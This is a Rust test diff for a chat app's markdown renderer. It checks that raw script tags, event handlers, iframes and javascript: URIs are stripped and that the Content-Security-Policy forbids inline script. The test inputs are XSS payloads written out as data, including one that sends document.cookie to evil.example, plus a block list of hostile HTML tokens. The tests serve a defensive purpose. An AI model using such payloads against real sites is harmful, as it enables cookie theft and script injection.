@@ -404,4 +404,195 @@ mod tests {
         let html = avatar_img("file:///tmp/avatar.png", "User");
         assert!(html.contains("file:///tmp/avatar.png"));
     }
+
+    // --- Issue #25: markdown XSS hardening ---
+
+    #[test]
+    fn raw_script_tag_in_assistant_markdown_is_stripped() {
+        let html = markdown_to_html("<script>alert(1)</script>hello");
+        assert!(
+            html.contains("hello"),
+            "legitimate text after raw HTML must survive, got: {html:?}"
+        );
+        assert!(
+            !html.to_ascii_lowercase().contains("<script"),
+            "raw <script> tag must be stripped from output, got: {html:?}"
+        );
+        assert!(
+            !html.contains("alert(1)"),
+            "script body must not appear verbatim in output, got: {html:?}"
+        );
+    }
+
+    #[test]
+    fn raw_img_with_onerror_in_assistant_markdown_is_stripped() {
+        let html = markdown_to_html("before <img src=x onerror=\"alert(1)\"> after");
+        assert!(html.contains("before"), "leading text must survive: {html:?}");
+        assert!(html.contains("after"), "trailing text must survive: {html:?}");
+        assert!(
+            !html.to_ascii_lowercase().contains("onerror"),
+            "onerror handler must never appear in output: {html:?}"
+        );
+        assert!(
+            !html.to_ascii_lowercase().contains("<img"),
+            "raw <img> tag (not from markdown ![]() syntax) must be stripped: {html:?}"
+        );
+    }
+
+    #[test]
+    fn raw_inline_html_anchor_with_javascript_uri_is_stripped() {
+        // pulldown-cmark emits Event::InlineHtml for inline tags like raw <a>.
+        // Both Html and InlineHtml events must be filtered.
+        let html = markdown_to_html("click <a href=\"javascript:alert(1)\">me</a> now");
+        assert!(
+            !html.to_ascii_lowercase().contains("javascript:"),
+            "javascript: URIs in raw inline HTML must be stripped: {html:?}"
+        );
+        assert!(
+            !html.to_ascii_lowercase().contains("<a "),
+            "raw <a> tag must be stripped: {html:?}"
+        );
+        assert!(html.contains("click"), "surrounding text must survive: {html:?}");
+        assert!(html.contains("now"), "surrounding text must survive: {html:?}");
+    }
+
+    #[test]
+    fn legitimate_markdown_formatting_still_renders() {
+        let md = "# Heading\n\n**bold** and *italic* and `code`.\n\n\
+                  - item 1\n- item 2\n\n\
+                  > quoted\n\n\
+                  [link](https://example.com)";
+        let html = markdown_to_html(md);
+        assert!(html.contains("<h1>Heading</h1>"), "headings render: {html:?}");
+        assert!(html.contains("<strong>bold</strong>"), "bold renders: {html:?}");
+        assert!(html.contains("<em>italic</em>"), "italic renders: {html:?}");
+        assert!(html.contains("<code>code</code>"), "inline code renders: {html:?}");
+        assert!(html.contains("<ul>") && html.contains("<li>item 1</li>"), "lists render: {html:?}");
+        assert!(html.contains("<blockquote>"), "blockquotes render: {html:?}");
+        assert!(
+            html.contains(r#"<a href="https://example.com">link</a>"#),
+            "markdown links render: {html:?}"
+        );
+    }
+
+    #[test]
+    fn csp_does_not_allow_inline_script() {
+        let template = html_template();
+        // Find the CSP meta tag and inspect the script-src directive.
+        let csp_start = template
+            .find("Content-Security-Policy")
+            .expect("template has CSP meta tag");
+        let after = &template[csp_start..];
+        let content_start = after.find("content=\"").expect("CSP has content attr") + "content=\"".len();
+        let content_end = content_start + after[content_start..].find('"').expect("CSP content closes");
+        let csp = &after[content_start..content_end];
+
+        // Find the script-src directive specifically.
+        let script_src = csp
+            .split(';')
+            .map(str::trim)
+            .find(|d| d.starts_with("script-src"))
+            .expect("CSP defines script-src");
+
+        assert!(
+            !script_src.contains("'unsafe-inline'"),
+            "script-src must not include 'unsafe-inline'; got: {script_src:?}"
+        );
+        assert!(
+            !script_src.contains("'unsafe-eval'"),
+            "script-src must not include 'unsafe-eval'; got: {script_src:?}"
+        );
+        // Must allow our scroll/copy/clipboard helpers via a hash or 'self', not inline.
+        assert!(
+            script_src.contains("'sha256-") || script_src.contains("'self'"),
+            "script-src must allow scripts via hash or self only; got: {script_src:?}"
+        );
+    }
+
+    #[test]
+    fn csp_script_hash_matches_inline_script_body() {
+        // The CSP sha256 hash MUST equal the SHA-256 of the inline <script> body.
+        // If they drift, the WebView silently refuses to run the script and the
+        // chat UI stops updating — this test pins them together.
+        let template = html_template();
+        let script_open = template.find("<script>").expect("template has inline script");
+        let body_start = script_open + "<script>".len();
+        let body_end = body_start
+            + template[body_start..]
+                .find("</script>")
+                .expect("inline script closes");
+        let body = &template[body_start..body_end];
+
+        use base64::Engine as _;
+        use sha2::{Digest, Sha256};
+        let digest = Sha256::digest(body.as_bytes());
+        let expected = format!(
+            "'sha256-{}'",
+            base64::engine::general_purpose::STANDARD.encode(digest)
+        );
+
+        assert!(
+            template.contains(&expected),
+            "CSP must contain hash {expected} that matches inline script body"
+        );
+    }
+
+    #[test]
+    fn multibyte_alt_text_does_not_panic() {
+        // Regression: avatar_img used `&alt[..1]` which panics on multibyte chars.
+        let html = avatar_img("", "\u{1F600}smile"); // grinning face emoji
+        // We only assert it doesn't panic and produces a fallback div; the exact
+        // glyph chosen is an implementation detail of the fix.
+        assert!(
+            html.contains("avatar-fallback"),
+            "expected fallback avatar markup, got: {html:?}"
+        );
+
+        // Also exercise via render_messages_html with an empty avatar URL,
+        // which is the actual call site that would have crashed.
+        let avatars = AvatarUrls {
+            adele: String::new(),
+            user: String::new(),
+        };
+        // Role labels in render_messages_html are ASCII ("You" / "Adele"),
+        // so to trigger the original bug we exercise avatar_img directly above.
+        let messages = vec![("assistant".to_string(), "hi".to_string())];
+        let _ = render_messages_html(&messages, None, &avatars);
+    }
+
+    #[test]
+    fn business_outcome_hostile_assistant_message_does_not_execute_js() {
+        // End-to-end-ish: a hostile assistant turn flows through the full
+        // markdown → message HTML pipeline. Nothing reaching the WebView
+        // should permit JS execution.
+        let hostile = "Sure, here is a tip:\n\n\
+                       <script>fetch('https://evil.example/'+document.cookie)</script>\n\n\
+                       <img src=x onerror=\"alert('pwn')\">\n\n\
+                       <iframe src=\"javascript:alert(1)\"></iframe>\n\n\
+                       <a href=\"javascript:alert(1)\" onclick=\"alert(2)\">click</a>\n\n\
+                       Bye!";
+        let messages = vec![("assistant".to_string(), hostile.to_string())];
+        let html = render_messages_html(&messages, None, &test_avatars());
+
+        // Legitimate content survives.
+        assert!(html.contains("Sure, here is a tip"), "leading text: {html}");
+        assert!(html.contains("Bye!"), "trailing text: {html}");
+
+        // No executable HTML constructs reach the rendered output.
+        let lower = html.to_ascii_lowercase();
+        for bad in [
+            "<script",
+            "onerror",
+            "onclick",
+            "onload",
+            "javascript:",
+            "<iframe",
+            "<img ",
+        ] {
+            assert!(
+                !lower.contains(bad),
+                "hostile token {bad:?} must not appear in rendered HTML; got: {html}"
+            );
+        }
+    }
 }
